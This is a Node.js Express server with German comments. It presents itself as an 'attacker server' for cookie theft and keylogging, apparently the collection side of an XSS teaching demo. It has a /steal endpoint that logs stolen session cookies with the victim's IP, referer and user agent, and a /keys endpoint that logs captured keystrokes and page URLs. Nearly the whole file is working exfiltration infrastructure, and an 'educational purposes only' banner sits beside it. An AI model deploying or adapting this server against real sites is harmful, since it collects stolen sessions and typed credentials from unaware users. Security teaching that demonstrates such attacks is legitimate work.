const express = require('express');
const cors = require('cors');
const app = express();
const port = 3000;

// CORS aktivieren - erlaubt Anfragen von anderen Domains
app.use(cors());

// Parse URL-Parameter
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Hilfsfunktion für Zeitstempel
function getTimestamp() {
    return new Date().toLocaleString('de-DE', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });
}

// Cookie-Diebstahl Endpoint
app.get('/steal', (req, res) => {
    const cookieString = req.query.c || '';
    const ip = req.ip || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unbekannt';
    const referer = req.headers['referer'] || 'Direkt';

    // Terminal-Ausgabe
    console.log('\n' + '═'.repeat(70));
    console.log('🍪 COOKIE-DIEBSTAHL ERKANNT!');
    console.log('═'.repeat(70));
    console.log('⏰ Zeit:       ', getTimestamp());
    console.log('🌐 IP-Adresse: ', ip);
    console.log('🔗 Referer:    ', referer);
    console.log('💻 User-Agent: ', userAgent);
    console.log('📦 Cookies:    ', cookieString || '(keine Cookies)');
    console.log('═'.repeat(70) + '\n');

    // Einfache Antwort
    res.status(200).send('OK');
});

// Keylogger Endpoint
app.get('/keys', (req, res) => {
    const keys = req.query.d || '';
    const url = req.query.u || 'Unbekannt';
    const ip = req.ip || req.connection.remoteAddress;

    // Terminal-Ausgabe
    console.log('\n' + '═'.repeat(70));
    console.log('⌨️  TASTATUREINGABE ABGEFANGEN!');
    console.log('═'.repeat(70));
    console.log('⏰ Zeit:       ', getTimestamp());
    console.log('🌐 IP-Adresse: ', ip);
    console.log('📍 URL:        ', url);
    console.log('⌨️  Eingabe:    ', keys);
    console.log('📏 Länge:      ', keys.length, 'Zeichen');
    console.log('═'.repeat(70) + '\n');

    // Einfache Antwort
    res.status(200).send('OK');
});

// Server starten
app.listen(port, () => {
    console.clear();
    console.log('\n' + '═'.repeat(70));
    console.log('ATTACKER SERVER GESTARTET');
    console.log('═'.repeat(70));
    console.log('\nServer läuft auf:  http://localhost:' + port);
    console.log('\nVerfügbare Endpoints:');
    console.log('   GET  /steal?c=<cookies>       - Cookie-Diebstahl');
    console.log('   GET  /keys?d=<keys>&u=<url>   - Keylogger');
    console.log('\n' + '═'.repeat(70));
    console.log('NUR FÜR BILDUNGSZWECKE!');
    console.log('═'.repeat(70));
    console.log('\nWarte auf eingehende Angriffe...\n');
});
